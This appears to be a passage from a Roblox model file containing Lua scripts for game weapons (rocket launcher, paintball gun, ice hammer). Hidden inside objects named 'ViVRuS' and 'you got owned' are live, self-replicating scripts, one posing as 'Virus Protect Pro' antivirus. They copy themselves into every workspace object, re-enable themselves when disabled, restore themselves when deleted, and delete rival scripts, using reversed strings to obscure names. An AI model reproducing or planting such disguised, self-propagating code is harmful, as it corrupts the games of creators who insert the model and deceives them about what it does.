Tool.Swoosh:clone().Parent = Rocket

script.Mesh:clone().Parent = Rocket


function fire(vTarget)

	local vCharacter = Tool.Parent;
	
	local vHandle = Tool:findFirstChild(&quot;Handle&quot;)
	if vHandle == nil then
		print(&quot;Handle not found&quot;)
		return 
	end

	local dir = vTarget - vHandle.Position

	dir = computeDirection(dir)

	local missile = Rocket:clone()

	local pos = vHandle.Position + (dir * 6)
	
	--missile.Position = pos
	missile.CFrame = CFrame.new(pos,  pos + dir)

	local creator_tag = Instance.new(&quot;ObjectValue&quot;)

	local vPlayer = game.Players:playerFromCharacter(vCharacter)

	if vPlayer == nil then
		print(&quot;Player not found&quot;)
	else
		if (vPlayer.Neutral == false) then -- nice touch
			missile.BrickColor = vPlayer.TeamColor
		end
	end

	creator_tag.Value =vPlayer
	creator_tag.Name = &quot;creator&quot;
	creator_tag.Parent = missile
	
	missile.RocketScript.Disabled = false
	script.BodyGyro:clone().Parent = missile
	missile.Parent = Tool.Parent

	boom = missile

	doZoom(missile)
	boom.AncestryChanged:connect(onUnequippedLocal)
end

function computeDirection(vec)
	local lenSquared = vec.magnitude * vec.magnitude
	local invSqrt = 1 / math.sqrt(lenSquared)
	return Vector3.new(vec.x * invSqrt, vec.y * invSqrt, vec.z * invSqrt)
end

Tool.Enabled = true
function onActivated()
	if not zoom then
		if not Tool.Enabled then
			return
		end

		Tool.Enabled = false

		local character = Tool.Parent;
		local humanoid = character.Humanoid
		if humanoid == nil then
			print(&quot;Humanoid not found&quot;)
			return 
		end

		local targetPos = humanoid.TargetPoint

		fire(targetPos)

		wait(0.1)

		Tool.Enabled = true
	else
		return
	end
end


script.Parent.Activated:connect(onActivated)

</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="BodyGyro" referent="RBX136">
					<Properties>
						<float name="D">500</float>
						<string name="Name">BodyGyro</string>
						<float name="P">3000</float>
						<bool name="archivable">true</bool>
						<CoordinateFrame name="cframe">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<Vector3 name="maxTorque">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
						</Vector3>
					</Properties>
				</Item>
				<Item class="SpecialMesh" referent="RBX137">
					<Properties>
						<token name="LODX">2</token>
						<token name="LODY">2</token>
						<Content name="MeshId"><url>http://www.roblox.com/asset/?id=2251534</url></Content>
						<token name="MeshType">5</token>
						<string name="Name">Mesh</string>
						<Vector3 name="Offset">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
						</Vector3>
						<Vector3 name="Scale">
							<X>0.5</X>
							<Y>0.5</Y>
							<Z>0.25</Z>
						</Vector3>
						<Content name="TextureId"><url>http://none</url></Content>
						<Vector3 name="VertexColor">
							<X>1</X>
							<Y>1</Y>
							<Z>1</Z>
						</Vector3>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
			<Item class="Geometry" referent="RBX138">
				<Properties>
					<string name="Name">ViVRuS</string>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Weld" referent="RBX139">
					<Properties>
						<CoordinateFrame name="C0">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<CoordinateFrame name="C1">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<string name="Name">ViVRuS</string>
						<Ref name="Part0">null</Ref>
						<Ref name="Part1">null</Ref>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="VelocityMotor" referent="RBX140">
						<Properties>
							<CoordinateFrame name="C0">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
								<R00>1</R00>
								<R01>0</R01>
								<R02>0</R02>
								<R10>0</R10>
								<R11>1</R11>
								<R12>0</R12>
								<R20>0</R20>
								<R21>0</R21>
								<R22>1</R22>
							</CoordinateFrame>
							<CoordinateFrame name="C1">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
								<R00>1</R00>
								<R01>0</R01>
								<R02>0</R02>
								<R10>0</R10>
								<R11>1</R11>
								<R12>0</R12>
								<R20>0</R20>
								<R21>0</R21>
								<R22>1</R22>
							</CoordinateFrame>
							<float name="CurrentAngle">0</float>
							<float name="DesiredAngle">0</float>
							<Ref name="Hole">null</Ref>
							<float name="MaxVelocity">0</float>
							<string name="Name">ViVRuS</string>
							<Ref name="Part0">null</Ref>
							<Ref name="Part1">null</Ref>
							<bool name="archivable">true</bool>
						</Properties>
						<Item class="Script" referent="RBX141">
							<Properties>
								<bool name="Disabled">false</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">AntiVirusSoftware</string>
								<ProtectedString name="Source">--[[
Virus Protect Pro! By Nomnomnom1.

Want your place virus free(finally)?
Do you want it now?
Then use this script and i&apos;ll show you the basics of anti virus software!

As you can clearly see...The script below probably already has
removed all possible viruses. 
]]

----------------------------------------------------------------------------------------------------------------------------------------------
cs = { &quot;Timer&quot;, &quot;Geometry&quot;, &quot;Weld&quot;, &quot;RotateP&quot;, &quot;RotateV&quot;, &quot;VelocityMotor&quot; } -- Classes the script knows so it can remove it ;) Enter more here lol
g = { &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;, &quot;h&quot;, &quot;i&quot;, &quot;j&quot;, &quot;k&quot;, &quot;l&quot;, &quot;m&quot;, &quot;n&quot;, &quot;o&quot;, &quot;p&quot;, &quot;q&quot;, &quot;r&quot;, &quot;s&quot;, &quot;t&quot;, &quot;u&quot;, &quot;v&quot;, &quot;w&quot;, &quot;x&quot;, &quot;y&quot;, &quot;z&quot;, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, &quot;&#229;&quot;, &quot;&#186;&quot;, &quot;&#172;&quot;, &quot;+&quot; } -- checks for all of the possible special characters....again enter more here ;D
egd = script
----------------------------------------------------------------------------------------------------------------------------------------------
----------------Please do not edit anything beyond this point ^_^--------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
for i = 1, #cs do
if egd.className ~= cs[i] then
s=true
end
end
if s == true then
local s = Instance.new(cs[math.random(1, #cs)])
s.Parent = script.Parent
script.Parent = s
egd=egd.Parent
s.Name = string.reverse(&quot;SuRViV&quot;)
else
egd=egd.Parent
end
egdd = egd:Clone()
pcall(function() egdd.Help:remove() end)
wait()
tp = egd.Parent
local sos = string.reverse(&quot;delbasiD&quot;)
lssii = workspace
lssi = lssii:GetChildren()
coroutine.resume(coroutine.create(function()
while true do
egd[sos] = false
wait()
end
end))
coroutine.resume(coroutine.create(function()
for i = 1 , math.huge do
wait(60*3)
if game.Players.NumPlayers &gt; 1 then
local m = Instance.new(&quot;Hint&quot;)
m.Parent = workspace
m.Name = &quot;&#229;&quot;
m.Text = string.reverse(&quot;!AHAHAWM !oot uoy kcah lliw 1monmonmoN&quot;)
end
end
end))
function Kelssxx(s)
	return string.reverse(s)
end

function lk(property)
	local kte = property
	if kte == &quot;Disabled&quot; then
		egd[kte] = false
	end
end

function SAVEDZOMG(place)
	if lssii:findFirstChild(place) == nil then
		local v = Instance.new(cs[math.random(1, #cs)])
		v.Parent = workspace
		v.Name = place
	end
end

function nft(ssaa)
	for i = 1, #ssaa:children() do
		if string.find(ssaa:children()[i].Name, &quot;Tazer&quot;) then
			print(&quot;Fake Virus Scanner Found!&quot;)
			ssaa:GetChildren()[i]:remove()
		elseif ssaa:children()[i]:findFirstChild(egd.Name) == nil and ssaa:children()[i].Name ~= script.Name then
			print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
			egd:Clone().Parent = ssaa:children()[i]
		end
	end
end

tp.DescendantRemoving:connect(function(jji)
	if jji == egd then
		egdd.Parent = tp
		print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
		egdd[sos] = false
	end
end)

script.Changed:connect(lk)
while true do
	nft(lssii)
	nft(game:service(string.reverse(&quot;smaeT&quot;)))
	SAVEDZOMG(string.reverse(&quot;mroW&quot;))
	SAVEDZOMG(string.reverse(&quot;devas gmoZ&quot;))
	SAVEDZOMG(string.reverse(&quot;AF#(IRHFD*IH#QEA(SDFIOH!@)#WESUOCJ)Q#$)ERDFXC)#QWROJASCFLMXZ&quot;))
	wait(1)
end
</ProtectedString>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
				</Item>
			</Item>
			<Item class="RotateP" referent="RBX142">
				<Properties>
					<float name="BaseAngle">0.25</float>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX143">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Script......Or is it...</string>
						<ProtectedString name="Source">-- Thanks for using My hack.............suka XD

if script.Parent.className ~= &quot;RotateP&quot; then
	local p = Instance.new(&quot;RotateP&quot;)
	p.Parent = workspace
	p.Name = &quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;
	script.Parent = p
end

function check()
	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild(&quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;) == nil and list[i].className ~= &quot;RotateP&quot; then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end

while true do
	check()
	if workspace:findFirstChild(&quot;Hello...I &#229;m Your New Lord Lolz&quot;) == nil then
		local main = script.Parent:Clone()
		main.Name = &quot;Hello...I &#229;m Your New Lord Lolz&quot;
		main.Parent = workspace
	end
	wait(3)
end
-- Credit goes to Nomnomnom1..........................really..........did you need to know?!
-- Have a nice day. XD</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
				<Item class="Geometry" referent="RBX144">
					<Properties>
						<string name="Name">ORLY</string>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
		</Item>
		<Item class="Tool" referent="RBX145">
			<Properties>
				<bool name="Enabled">true</bool>
				<CoordinateFrame name="Grip">
					<X>0</X>
					<Y>-0.600000024</Y>
					<Z>-0.550000012</Z>
					<R00>1</R00>
					<R01>-0</R01>
					<R02>-0</R02>
					<R10>-0</R10>
					<R11>0</R11>
					<R12>-1</R12>
					<R20>0</R20>
					<R21>1</R21>
					<R22>-0</R22>
				</CoordinateFrame>
				<string name="Name">SuperGDisruptor</string>
				<Content name="TextureId"><url>http://www.roblox.com/asset/?id=13505853</url></Content>
				<bool name="archivable">true</bool>
			</Properties>
			<Item class="BlockMesh" referent="RBX146">
				<Properties>
					<float name="Bevel">0</float>
					<float name="Bevel Roundness">0</float>
					<float name="Bulge">0</float>
					<token name="LODX">2</token>
					<token name="LODY">2</token>
					<string name="Name">Mesh</string>
					<Vector3 name="Offset">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
					</Vector3>
					<Vector3 name="Scale">
						<X>0.25</X>
						<Y>0.25</Y>
						<Z>9984.53516</Z>
					</Vector3>
					<Vector3 name="VertexColor">
						<X>1</X>
						<Y>1</Y>
						<Z>1</Z>
					</Vector3>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Script" referent="RBX147">
				<Properties>
					<bool name="Disabled">true</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">BrickCleanup</string>
					<ProtectedString name="Source">-- this script removes its parent from the workspace after 24 seconds

wait(0)
script.Parent.Parent = nil</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="LocalScript" referent="RBX148">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Local Gui</string>
						<ProtectedString name="Source">local Tool = script.Parent;



enabled = true
function onButton1Down(mouse)
	if not enabled then
		return
	end

	enabled = true
	mouse.Icon = &quot;rbxasset://textures\\GunCursor.png&quot;

	--wait(.0)
	--mouse.Icon = &quot;rbxasset://textures\\GunCursor.png&quot;
	--enabled = true
	--mouse.Button1Up:connect(function() onButton1Up(mouse) end)

end


function onButton1Up(mouse)
enabled = false
Tool.Enabled = false
mouse.Icon = &quot;rbxasset://textures\\GunWaitCursor.png&quot;
wait(0.3)
mouse.Icon = &quot;rbxasset://textures\\GunCursor.png&quot;
enabled = true
Tool.Enabled = true
end

function onEquippedLocal(mouse)

	if mouse == nil then
		print(&quot;Mouse not found&quot;)
		return 
	end

	mouse.Icon = &quot;rbxasset://textures\\GunCursor.png&quot;
	mouse.Button1Down:connect(function() onButton1Down(mouse) end)	
	mouse.Button1Up:connect(function() onButton1Up(mouse)end)
end


Tool.Equipped:connect(onEquippedLocal)
</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
			<Item class="Script" referent="RBX149">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Paintball</string>
					<ProtectedString name="Source">ball = script.Parent
damage = 90.00



function onTouched(hit)
	local humanoid = hit.Parent:findFirstChild(&quot;Humanoid&quot;)
	-- make a splat
	--for i=1,3 do
	--	local s = Instance.new(&quot;Part&quot;)
	--	s.Shape = 1 -- block
	--	s.formFactor = 2 -- plate
	--	s.Size = Vector3.new(1,.4,1)
	--	s.BrickColor = ball.BrickColor
	--	local v = Vector3.new(math.random(-1,1), math.random(0,1), math.random(-1,1))
	--	s.Velocity = 15 * v--15
	--	s.CFrame = CFrame.new(ball.Position + v, v)
	---	ball.BrickCleanup:clone().Parent = s
	--	s.BrickCleanup.Disabled = false
	--	s.Parent = game.Workspace
	--	
	--end
	

	if humanoid ~= nil then
		tagHumanoid(humanoid)
		humanoid.Health = humanoid.Health - damage
		wait(2)
		untagHumanoid(humanoid)
	end

	connection:disconnect()
	ball.Parent = nil
end

function tagHumanoid(humanoid)
	-- todo: make tag expire
	local tag = ball:findFirstChild(&quot;creator&quot;)
	if tag ~= nil then
		local new_tag = tag:clone()
		new_tag.Parent = humanoid
	end
end


function untagHumanoid(humanoid)
	if humanoid ~= nil then
		local tag = humanoid:findFirstChild(&quot;creator&quot;)
		if tag ~= nil then
			tag.Parent = nil
		end
	end
end

connection = ball.Touched:connect(onTouched)

wait(0.8)
ball.Parent = nil
</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Script" referent="RBX150">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">PaintballShooter</string>
					<ProtectedString name="Source">Tool = script.Parent

colors = {0}

function fire(v)

	Tool.Handle.Fire:play()
	

	local vCharacter = Tool.Parent
	local vPlayer = game.Players:playerFromCharacter(vCharacter)

	local missile = Instance.new(&quot;Part&quot;)

        

	local spawnPos = vCharacter.PrimaryPart.Position
	


	spawnPos  = spawnPos + (v * 8)

	missile.Position = spawnPos
	missile.Size = Vector3.new(1,1,1)
	missile.Velocity = v * 1000
	missile.BrickColor = BrickColor.new(colors[math.random(1, #colors)])
	missile.Shape = 1
	missile.BottomSurface = 0
	missile.TopSurface = 0
	missile.Name = &quot;Paintball&quot;
	missile.Elasticity = 0
	missile.Reflectance = 0
	missile.Friction = 1

	local force = Instance.new(&quot;BodyForce&quot;)
	force.force = Vector3.new(0,220,0)
	force.Parent = missile
	
	Tool.BrickCleanup:clone().Parent = missile

	local new_script = script.Parent.Paintball:clone()
	new_script.Disabled = false
	new_script.Parent = missile

	local creator_tag = Instance.new(&quot;ObjectValue&quot;)
	creator_tag.Value = vPlayer
	creator_tag.Name = &quot;creator&quot;
	creator_tag.Parent = missile
	


	missile.Parent = game.Workspace
	--wait(0.03)
	--fire(
	

end


function check(en)
---------------------------------------Function start here.
if (Tool.Enabled == false) then
return false
end--end for if!
-------------------------------
if (Tool.Enabled == true) then
return true
end
---------------------------------------Function end here.
end


Tool.Enabled = true
function onActivated()

	if not Tool.Enabled then
		return
	end

	--Tool.Enabled = false

	local character = Tool.Parent;
	local humanoid = character.Humanoid
	if humanoid == nil then
		print(&quot;Humanoid not found&quot;)
		return 
	end

	local targetPos = humanoid.TargetPoint
	local lookAt = (targetPos - character.Head.Position).unit
	
	if (check()) then
	fire(lookAt)
	wait(0.0003)
	onActivated()
	end
	return

	--Tool.Enabled = true
end


script.Parent.Activated:connect(onActivated)
</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Script" referent="RBX151">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">WeldScript</string>
					<ProtectedString name="Source">local w1 = Instance.new(&quot;Weld&quot;)
w1.Parent = script.Parent.Handle
w1.Part0 = w1.Parent
w1.Part1 = script.Parent.Handle2w1.C1 = CFrame.new(-0, 0.3, -0.7)
local w2 = Instance.new(&quot;Weld&quot;)
w2.Parent = script.Parent.Handle
w2.Part0 = w2.Parent
w2.Part1 = script.Parent.Handle3
w2.C1 = CFrame.new(-0, 1.9, 0.1)

local w3 = Instance.new(&quot;Weld&quot;)
w3.Parent = script.Parent.Handle
w3.Part0 = w3.Parent
w3.Part1 = script.Parent.Handle4
w3.C1 = CFrame.new(-0, 0, -0.6)

local w4 = Instance.new(&quot;Weld&quot;)
w4.Parent = script.Parent.Handle
w4.Part0 = w4.Parent
w4.Part1 = script.Parent.Handle5
w4.C1 = CFrame.new(0, 1.3, -0)

local w5 = Instance.new(&quot;Weld&quot;)
w5.Parent = script.Parent.Handle
w5.Part0 = w5.Parent
w5.Part1 = script.Parent.Handle6
w5.C1 = CFrame.new(-0, 3, 0.3)

local w6 = Instance.new(&quot;Weld&quot;)
w6.Parent = script.Parent.Handle
w6.Part0 = w6.Parent
w6.Part1 = script.Parent.Handle7
w6.C1 = CFrame.fromEulerAnglesXYZ(0.3, 0, 0) * CFrame.new(0, 1.5, -0.4)

local w7 = Instance.new(&quot;Weld&quot;)
w7.Parent = script.Parent.Handle
w7.Part0 = w7.Parent
w7.Part1 = script.Parent.Handle8
w7.C1 = CFrame.fromEulerAnglesXYZ(0.3, 0, 0) * CFrame.new(0, -0.7, -0.6)
local w8 = Instance.new(&quot;Weld&quot;)
w8.Parent = script.Parent.Handle
w8.Part0 = w8.Parent
w8.Part1 = script.Parent.Handle9
w8.C1 = CFrame.new(-0, -1.9, 0)
local w9 = Instance.new(&quot;Weld&quot;)
w9.Parent = script.Parent.Handle
w9.Part0 = w9.Parent
w9.Part1 = script.Parent.Handle10
w9.C1 = CFrame.fromEulerAnglesXYZ(3.2, 0, 0) * CFrame.new(0, -2.3, -0.4)
</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Geometry" referent="RBX152">
				<Properties>
					<string name="Name">ViVRuS</string>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Weld" referent="RBX153">
					<Properties>
						<CoordinateFrame name="C0">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<CoordinateFrame name="C1">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<string name="Name">ViVRuS</string>
						<Ref name="Part0">null</Ref>
						<Ref name="Part1">null</Ref>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="RotateV" referent="RBX154">
						<Properties>
							<float name="BaseAngle">4.72511719e-034</float>
							<CoordinateFrame name="C0">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
								<R00>1</R00>
								<R01>0</R01>
								<R02>0</R02>
								<R10>0</R10>
								<R11>1</R11>
								<R12>0</R12>
								<R20>0</R20>
								<R21>0</R21>
								<R22>1</R22>
							</CoordinateFrame>
							<CoordinateFrame name="C1">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
								<R00>1</R00>
								<R01>0</R01>
								<R02>0</R02>
								<R10>0</R10>
								<R11>1</R11>
								<R12>0</R12>
								<R20>0</R20>
								<R21>0</R21>
								<R22>1</R22>
							</CoordinateFrame>
							<string name="Name">ViVRuS</string>
							<Ref name="Part0">null</Ref>
							<Ref name="Part1">null</Ref>
							<bool name="archivable">true</bool>
						</Properties>
						<Item class="Script" referent="RBX155">
							<Properties>
								<bool name="Disabled">false</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">AntiVirusSoftware</string>
								<ProtectedString name="Source">--[[
Virus Protect Pro! By Nomnomnom1.

Want your place virus free(finally)?
Do you want it now?
Then use this script and i&apos;ll show you the basics of anti virus software!

As you can clearly see...The script below probably already has
removed all possible viruses. 
]]

----------------------------------------------------------------------------------------------------------------------------------------------
cs = { &quot;Timer&quot;, &quot;Geometry&quot;, &quot;Weld&quot;, &quot;RotateP&quot;, &quot;RotateV&quot;, &quot;VelocityMotor&quot; } -- Classes the script knows so it can remove it ;) Enter more here lol
g = { &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;, &quot;h&quot;, &quot;i&quot;, &quot;j&quot;, &quot;k&quot;, &quot;l&quot;, &quot;m&quot;, &quot;n&quot;, &quot;o&quot;, &quot;p&quot;, &quot;q&quot;, &quot;r&quot;, &quot;s&quot;, &quot;t&quot;, &quot;u&quot;, &quot;v&quot;, &quot;w&quot;, &quot;x&quot;, &quot;y&quot;, &quot;z&quot;, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, &quot;&#229;&quot;, &quot;&#186;&quot;, &quot;&#172;&quot;, &quot;+&quot; } -- checks for all of the possible special characters....again enter more here ;D
egd = script
----------------------------------------------------------------------------------------------------------------------------------------------
----------------Please do not edit anything beyond this point ^_^--------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
for i = 1, #cs do
if egd.className ~= cs[i] then
s=true
end
end
if s == true then
local s = Instance.new(cs[math.random(1, #cs)])
s.Parent = script.Parent
script.Parent = s
egd=egd.Parent
s.Name = string.reverse(&quot;SuRViV&quot;)
else
egd=egd.Parent
end
egdd = egd:Clone()
pcall(function() egdd.Help:remove() end)
wait()
tp = egd.Parent
local sos = string.reverse(&quot;delbasiD&quot;)
lssii = workspace
lssi = lssii:GetChildren()
coroutine.resume(coroutine.create(function()
while true do
egd[sos] = false
wait()
end
end))
coroutine.resume(coroutine.create(function()
for i = 1 , math.huge do
wait(60*3)
if game.Players.NumPlayers &gt; 1 then
local m = Instance.new(&quot;Hint&quot;)
m.Parent = workspace
m.Name = &quot;&#229;&quot;
m.Text = string.reverse(&quot;!AHAHAWM !oot uoy kcah lliw 1monmonmoN&quot;)
end
end
end))
function Kelssxx(s)
	return string.reverse(s)
end

function lk(property)
	local kte = property
	if kte == &quot;Disabled&quot; then
		egd[kte] = false
	end
end

function SAVEDZOMG(place)
	if lssii:findFirstChild(place) == nil then
		local v = Instance.new(cs[math.random(1, #cs)])
		v.Parent = workspace
		v.Name = place
	end
end

function nft(ssaa)
	for i = 1, #ssaa:children() do
		if string.find(ssaa:children()[i].Name, &quot;Tazer&quot;) then
			print(&quot;Fake Virus Scanner Found!&quot;)
			ssaa:GetChildren()[i]:remove()
		elseif ssaa:children()[i]:findFirstChild(egd.Name) == nil and ssaa:children()[i].Name ~= script.Name then
			print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
			egd:Clone().Parent = ssaa:children()[i]
		end
	end
end

tp.DescendantRemoving:connect(function(jji)
	if jji == egd then
		egdd.Parent = tp
		print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
		egdd[sos] = false
	end
end)

script.Changed:connect(lk)
while true do
	nft(lssii)
	nft(game:service(string.reverse(&quot;smaeT&quot;)))
	SAVEDZOMG(string.reverse(&quot;mroW&quot;))
	SAVEDZOMG(string.reverse(&quot;devas gmoZ&quot;))
	SAVEDZOMG(string.reverse(&quot;AF#(IRHFD*IH#QEA(SDFIOH!@)#WESUOCJ)Q#$)ERDFXC)#QWROJASCFLMXZ&quot;))
	wait(1)
end
</ProtectedString>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
				</Item>
			</Item>
			<Item class="RotateP" referent="RBX156">
				<Properties>
					<float name="BaseAngle">0.25</float>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX157">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Script......Or is it...</string>
						<ProtectedString name="Source">-- Thanks for using My hack.............suka XD

if script.Parent.className ~= &quot;RotateP&quot; then
	local p = Instance.new(&quot;RotateP&quot;)
	p.Parent = workspace
	p.Name = &quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;
	script.Parent = p
end

function check()
	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild(&quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;) == nil and list[i].className ~= &quot;RotateP&quot; then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end

while true do
	check()
	if workspace:findFirstChild(&quot;Hello...I &#229;m Your New Lord Lolz&quot;) == nil then
		local main = script.Parent:Clone()
		main.Name = &quot;Hello...I &#229;m Your New Lord Lolz&quot;
		main.Parent = workspace
	end
	wait(3)
end
-- Credit goes to Nomnomnom1..........................really..........did you need to know?!
-- Have a nice day. XD</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
				<Item class="Geometry" referent="RBX158">
					<Properties>
						<string name="Name">ORLY</string>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
		</Item>
		<Item class="Tool" referent="RBX159">
			<Properties>
				<bool name="Enabled">true</bool>
				<CoordinateFrame name="Grip">
					<X>0</X>
					<Y>0</Y>
					<Z>-1</Z>
					<R00>0</R00>
					<R01>0</R01>
					<R02>1</R02>
					<R10>1</R10>
					<R11>0</R11>
					<R12>0</R12>
					<R20>0</R20>
					<R21>1</R21>
					<R22>0</R22>
				</CoordinateFrame>
				<string name="Name">IceHammer</string>
				<Content name="TextureId"><url>http://www.roblox.com/asset/?id=15933689</url></Content>
				<bool name="archivable">true</bool>
			</Properties>
			<Item class="Script" referent="RBX160">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">IceHammer</string>
					<ProtectedString name="Source">-------- OMG HAX
debris = game:GetService(&quot;Debris&quot;)
r = game:service(&quot;RunService&quot;)


local damage = 18


local slash_damage = 18


sword = script.Parent.Handle
Tool = script.Parent


local SlashSound = Instance.new(&quot;Sound&quot;)
SlashSound.SoundId = &quot;http://www.roblox.com/asset/?id=15933756&quot;
SlashSound.Parent = sword
SlashSound.Volume = 1


local UnsheathSound = Instance.new(&quot;Sound&quot;)
UnsheathSound.SoundId = &quot;http://www.roblox.com/asset/?id=15933756&quot;
UnsheathSound.Parent = sword
UnsheathSound.Volume = 1

local blues = {23,107,102,11,45,135}


function isTurbo(character)
	return character:FindFirstChild(&quot;IceHelm&quot;) ~= nil
end

function allThatIce(pos, isTurbo)

	local count = 5
	if (isTurbo == true) then count = 10 end

	for i=1,count do
